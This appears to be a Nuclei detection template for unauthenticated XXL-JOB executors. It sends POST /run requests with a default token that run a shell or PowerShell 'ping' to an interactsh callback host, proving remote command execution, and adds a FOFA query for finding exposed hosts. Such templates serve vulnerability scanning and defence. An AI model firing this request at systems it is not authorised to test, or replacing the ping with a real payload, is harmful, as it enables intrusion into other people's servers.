http:
- matchers:
  - part: body
    type: word
    words:
    - '{"code":200}'
  - status:
    - 200
    type: status
  - part: interactsh_protocol
    type: word
    words:
    - dns
  matchers-condition: and
  raw:
  - "POST /run HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nXxl-Job-Access-Token:\
    \ default_token\nContent-Length: 396\n\n{\n  \"jobId\": {{rand_int(1000)}},\n\
    \  \"executorHandler\": \"demoJobHandler\",\n  \"executorParams\": \"demoJobHandler\"\
    ,\n  \"executorBlockStrategy\": \"COVER_EARLY\",\n  \"executorTimeout\": 0,\n\
    \  \"logId\": 1,\n  \"logDateTime\": 1586629003729,\n  \"glueType\": \"GLUE_SHELL\"\
    ,\n  \"glueSource\": \"ping {{interactsh-url}}\",\n  \"glueUpdatetime\": 1586699003758,\n\
    \  \"broadcastIndex\": 0,\n  \"broadcastTotal\": 0\n}\n"
  - "POST /run HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nXxl-Job-Access-Token:\
    \ default_token\nContent-Length: 396\n\n{\n  \"jobId\": {{rand_int(1000)}},\n\
    \  \"executorHandler\": \"demoJobHandler\",\n  \"executorParams\": \"demoJobHandler\"\
    ,\n  \"executorBlockStrategy\": \"COVER_EARLY\",\n  \"executorTimeout\": 0,\n\
    \  \"logId\": 1,\n  \"logDateTime\": 1586629003729,\n  \"glueType\": \"GLUE_POWERSHELL\"\
    ,\n  \"glueSource\": \"ping {{interactsh-url}}\",\n  \"glueUpdatetime\": 1586699003758,\n\
    \  \"broadcastIndex\": 0,\n  \"broadcastTotal\": 0\n}\n"
  stop-at-first-match: true
id: xxljob-executor-unauth
info:
  author: k3rwin
  description: 'XXL-JOB is a distributed task scheduling platform. Its core design
    goals are rapid development, easy learning, lightweight, and easy expansion. The
    source code is now open and connected to the online product lines of many companies,
    ready to use out of the box. XXL-JOB is divided into two ends: admin and executor.
    The former is the background management page, and the latter is the client for
    task execution. The executor is not configured with authentication by default,
    and unauthorized attackers can execute arbitrary commands through the RESTful
    API.

    '
  metadata:
    fofa-query: app="XXL-JOB"
    max-request: 2
    verified: true
  name: XXL-JOB executor - Unauthorized Access
  reference:
  - https://github.com/jas502n/xxl-job/blob/main/README.md
  - https://github.com/vulhub/vulhub/blob/master/xxl-job/unacc/README.md
  severity: critical
  tags: xxljob,unauth,misconfig,rce
